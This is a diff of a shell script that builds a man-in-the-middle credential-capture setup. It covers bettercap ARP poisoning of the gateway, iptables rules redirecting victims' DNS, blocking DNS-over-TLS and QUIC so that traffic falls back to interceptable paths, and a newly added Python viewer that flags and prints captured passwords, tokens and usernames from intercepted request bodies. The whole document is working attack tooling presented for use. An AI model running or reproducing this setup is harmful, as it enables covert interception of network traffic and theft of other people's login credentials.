@@ -36,10 +36,6 @@ for c in http-s-proxy dns-filter; do
     fi
 done
 
-# Prime the kernel ARP cache for the gateway. bettercap's gateway monitor
-# reads /proc/net/arp; if our entry has expired or was never populated
-# (e.g. we just woke up / reassociated), it errors with "could not find
-# mac for <gateway>" and fullduplex poisoning of the gateway side stalls.
 GATEWAY=$(ip route show dev "$INTERFACE" | awk '/^default/{print $3; exit}')
 if [ -n "$GATEWAY" ]; then
     echo "Priming ARP cache for gateway $GATEWAY ..."
@@ -51,48 +47,107 @@ sudo iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 443 ! -d "$MY_
 sudo iptables -A INPUT -i "$INTERFACE" -p tcp --dport 80  -j ACCEPT
 sudo iptables -A INPUT -i "$INTERFACE" -p tcp --dport 443 -j ACCEPT
 
-# DNS interception: route all victim DNS lookups to our dnsmasq sidecar
-# (bound on host :5300 to avoid the usual port-53 conflict with
-# systemd-resolved / NetworkManager). The filter strips HTTPS/SVCB
-# records (kills ECH) and AAAA records (forces IPv4 so our v4-only NAT
-# actually catches the traffic).
+# DNS interception
 sudo iptables -t nat -A PREROUTING -i "$INTERFACE" -p udp --dport 53 -j REDIRECT --to-ports 5300
 sudo iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 53 -j REDIRECT --to-ports 5300
 sudo iptables -A INPUT -i "$INTERFACE" -p udp --dport 5300 -j ACCEPT
 sudo iptables -A INPUT -i "$INTERFACE" -p tcp --dport 5300 -j ACCEPT
 
-# Kill DNS-over-TLS (port 853) so browsers/OS fall back to plain DNS,
-# which our filtering resolver then catches.
+# Kill DNS-over-TLS
 sudo iptables -I FORWARD -i "$INTERFACE" -p tcp --dport 853 -j REJECT --reject-with tcp-reset
 sudo iptables -I FORWARD -i "$INTERFACE" -p udp --dport 853 -j REJECT --reject-with icmp-port-unreachable
 
-# Kill HTTP/3 / QUIC. Without this, Chrome/Edge cache Alt-Svc=h3 and
-# switch to UDP, which would otherwise be forwarded transparently past
-# Caddy -> ERR_QUIC_PROTOCOL_ERROR or cert bypass. Covers the standard
-# 443 plus a few alternates CDNs sometimes advertise.
+# Kill HTTP/3 / QUIC
 sudo iptables -I FORWARD -i "$INTERFACE" -p udp -m multiport --dports 80,443,8443 -j REJECT --reject-with icmp-port-unreachable
 sudo iptables -I INPUT   -i "$INTERFACE" -p udp -m multiport --dports 80,443,8443 -j REJECT --reject-with icmp-port-unreachable
 
-# Write a tail-logs helper that pretty-prints Caddy access + body logs.
+# Pretty log viewer
+cat > /tmp/logviewer.py <<'PYEOF'
+#!/usr/bin/env python3
+import sys, json, urllib.parse
+
+RED, CYAN, DIM, RESET = '\033[31;1m', '\033[36m', '\033[2m', '\033[0m'
+LOGIN_KEYS = {"password", "passwd", "pass", "pwd",
+              "login", "signin", "sign_in",
+              "token", "email", "username", "user", "account", "secret"}
+
+def strip_query(u):
+    return (u or "/").split("?", 1)[0]
+
+def strip_port(a):
+    if not a:
+        return "?"
+    return a.rsplit(":", 1)[0] if ":" in a else a
+
+def parse_body(body, ct):
+    ct = (ct or "").lower()
+    if "x-www-form-urlencoded" in ct:
+        try:
+            return dict(urllib.parse.parse_qsl(body, keep_blank_values=True))
+        except Exception:
+            return None
+    if "application/json" in ct or body[:1] in "{[":
+        try:
+            obj = json.loads(body)
+            if isinstance(obj, dict):
+                return {k: (v if isinstance(v, str) else json.dumps(v))
+                        for k, v in obj.items()}
+        except Exception:
+            return None
+    return None
+
+def looks_like_login(uri, body):
+    hay = (uri + " " + body).lower()
+    return any(kw in hay for kw in LOGIN_KEYS)
+
+for line in sys.stdin:
+    try:
+        e = json.loads(line.strip())
+    except Exception:
+        continue
+    msg = e.get("msg")
+    if msg == "handled request":
+        r = e.get("request", {})
+        ip     = strip_port(r.get("remote_ip", "?"))
+        method = r.get("method", "?")
+        host   = r.get("host", "?")
+        uri    = strip_query(r.get("uri", "/"))
+        status = e.get("status", "?")
+        dur    = e.get("duration", 0)
+        print(f"ACCESS [{ip}]  {method} {host}{uri}  {status} ({dur:.3f}s)",
+              flush=True)
+    elif msg == "request body":
+        ip     = strip_port(e.get("remote_ip", "?"))
+        method = e.get("method", "?")
+        host   = e.get("host", "?")
+        uri    = strip_query(e.get("uri", "/"))
+        ct     = e.get("content_type", "") or ""
+        body   = e.get("body", "") or ""
+        login  = looks_like_login(uri, body)
+        color  = RED if login else CYAN
+        tag    = "*** LIKELY LOGIN ***" if login else "BODY"
+        print(f"{color}{tag} [{ip}]  {method} {host}{uri}{RESET}",
+              flush=True)
+        parsed = parse_body(body, ct)
+        if parsed:
+            w = max((len(k) for k in parsed), default=4)
+            for k, v in parsed.items():
+                if len(v) > 200:
+                    v = v[:200] + "..."
+                print(f"{color}  {k.upper():<{w}} : {v}{RESET}", flush=True)
+        else:
+            snippet = body if len(body) <= 300 else body[:300] + "..."
+            print(f"{DIM}  (CT={ct or 'unknown'}){RESET}", flush=True)
+            print(f"{color}  RAW : {snippet}{RESET}", flush=True)
+PYEOF
+
 cat > /tmp/tail-logs.sh <<EOF
 #!/bin/bash
-if ! command -v jq >/dev/null 2>&1; then
-    echo "jq missing - showing raw logs. Install with: sudo apt install -y jq" >&2
+if ! command -v python3 >/dev/null 2>&1; then
+    echo "python3 missing - showing raw logs. sudo apt install -y python3" >&2
     exec sudo $DC logs -f --no-log-prefix http-s-proxy
 fi
-sudo $DC logs -f --no-log-prefix http-s-proxy 2>&1 | jq -rR '
-  fromjson?
-  | select(.msg=="handled request" or .msg=="request body")
-  | if .msg=="handled request" then
-      "ACCESS [\(.request.remote_ip)]  \(.request.method) \(.request.host)\(.request.uri)  \(.status) (\(.duration|tostring)s)"
-    else
-      ((.uri // "") + " " + (.body // "") | ascii_downcase) as \$h
-      | if \$h | test("password|passwd|login|signin|sign_in|token|email|username|user=|pass=") then
-          "[31;1m*** LIKELY LOGIN *** [\(.remote_ip)]  \(.method) \(.host)\(.uri)\n    CT=\(.content_type)\n    BODY: \(.body)[0m"
-        else
-          "BODY    [\(.remote_ip)]  \(.method) \(.host)\(.uri)\n    CT=\(.content_type)\n    BODY: \(.body)"
-        end
-    end'
+sudo $DC logs -f --no-log-prefix http-s-proxy 2>&1 | python3 /tmp/logviewer.py
 EOF
 chmod +x /tmp/tail-logs.sh
 
@@ -138,6 +193,6 @@ if [ -n "$LOG_TERM_PID" ]; then
     kill -- -"$LOG_TERM_PID" 2>/dev/null
 fi
 
-sudo rm -f /tmp/active.cap /tmp/tail-logs.sh
+sudo rm -f /tmp/active.cap /tmp/tail-logs.sh /tmp/logviewer.py
 
 echo "Done."
